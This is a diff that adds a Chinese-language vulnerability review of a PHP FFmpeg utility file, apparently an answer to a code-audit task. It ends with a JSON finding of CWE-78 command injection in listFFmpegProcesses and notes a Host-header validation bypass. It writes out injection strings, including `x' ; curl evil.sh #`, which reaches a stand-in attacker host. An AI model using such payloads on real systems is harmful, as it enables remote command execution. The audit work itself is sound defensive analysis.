@@ -1,0 +1,41 @@
+## 编号分析
+
+1. **第 2–7 行**：读取 `$global['timeLimit']` 设置超时/内存，无安全影响。
+
+2. **第 9–15 行 `getStandaloneAPIEndpoint`**：将 `$apiName` 直接拼入 URL。若 `$apiName` 来自用户输入可造成 SSRF/参数注入，但本文件内调用点（第 41 行）传入常量 `'decryptString'`，当前无直接漏洞。
+
+3. **第 17–24 行 `getStandaloneAPIAuthPayload`**：从 `$_REQUEST['APISecret']` 取值仅作转发（source），未发现 sink 拼接进 shell 或 SQL。
+
+4. **第 26–36 行 `isStandaloneDecryptedPayloadValid`**：**严重逻辑缺陷**——只要 `$_SERVER["SERVER_NAME"] === 'vlu.me'` 就无条件返回 true，完全跳过时间校验。攻击者若能控制 Host 头（常见于配置不当或反代场景），可使任意解密载荷通过验证，绕过时效性防重放机制（CWE-346 / CWE-807）。
+
+5. **第 38–57 行 `_decryptString`**：将远程返回内容 json_decode 后交给上述校验函数；由于第 4 点缺陷，校验可被绕过。
+
+6. **第 60–76 行 `getInput`**：CLI 下遍历 `$argv` 匹配前缀取值，HTTP 下直接取 `$_REQUEST[$key]`，**无任何过滤**，是典型的污点 source。
+
+7. **第 79–101 行 `sanitizeFFmpegCommand`**：
+   - 黑名单式过滤（删除 `&&`、剥离 `[;|`<>$()\n\r{}]`），按分析要求视为可绕过；
+   - 未过滤引号、反斜杠、空格、`&` 单字符、通配符；
+   - 前缀白名单用 `strpos(...)===0` 校验，但校验的是**过滤后**的字符串且允许命令内含任意 ffmpeg 参数，可读写任意文件、访问内网 URL（SSRF）。
+   - 属于弱防御，非有效防御。
+
+8. **第 104–120 行 `convertElapsedTimeToSeconds`**：纯数值解析，安全。
+
+9. **第 122–149 行 `listFFmpegProcesses($keyword)`**：**关键漏洞点**。第 127 行 `$command .= " | grep '$keyword'";` 将 `$keyword` **未经任何转义**拼入 shell 字符串，随后第 129 行 `exec($command,...)` 执行。虽然外层有单引号包裹，攻击者只需在 `$keyword` 中注入单引号即可闭合并追加任意命令，例如 `keyword=x' ; curl evil.sh #`。该函数的调用方通常以 `getInput('keyword')` 的结果传参（source 为 `$_REQUEST`/argv），构成完整的 source→sink 命令注入链（CWE-78）。对比第 152–158 行 `killFFmpegProcess` 正确使用了 `escapeshellarg`，证明此处是遗漏而非设计如此。
+
+10. **第 151–170 行 `killFFmpegProcess`**：先 `is_numeric` 校验再 `escapeshellarg`，防御有效，无漏洞。
+
+11. **第 172–193 行注释掉的 `fixConcatFfmpegCommand`**：不参与执行，不计入。
+
+**第二入口核查**：除 HTTP `$_REQUEST` 外，CLI argv（第 66–71 行）同样可作为 source 进入 `listFFmpegProcesses`；`SERVER_NAME` 可被 Host 头影响，是 `isStandaloneDecryptedPayloadValid` 绕过的替代通道。
+
+```json
+{
+  "has_vulnerability": true,
+  "vulnerability_type": "CWE-78 OS Command Injection",
+  "risk_level": "critical",
+  "source": "line 60-76: getInput 从 $_REQUEST 或 CLI argv 获取用户可控的 keyword 参数",
+  "sink": "line 127-129: listFFmpegProcesses 中 $keyword 未转义拼接进 grep 后经 exec 执行",
+  "explanation": "getInput 返回原始用户输入 -> listFFmpegProcesses 第 127 行以单引号拼接 $keyword 到 shell 命令 -> 攻击者注入单引号闭合引号并附加任意命令如 x' ; id # -> exec 直接执行实现远程命令执行",
+  "fix_suggestion": "line 127: 使用 escapeshellarg 包裹 keyword，例如改为 $command .= ' | grep '.escapeshellarg($keyword); 同时修复 line 30-32 对 SERVER_NAME 的无条件信任"
+}
+```
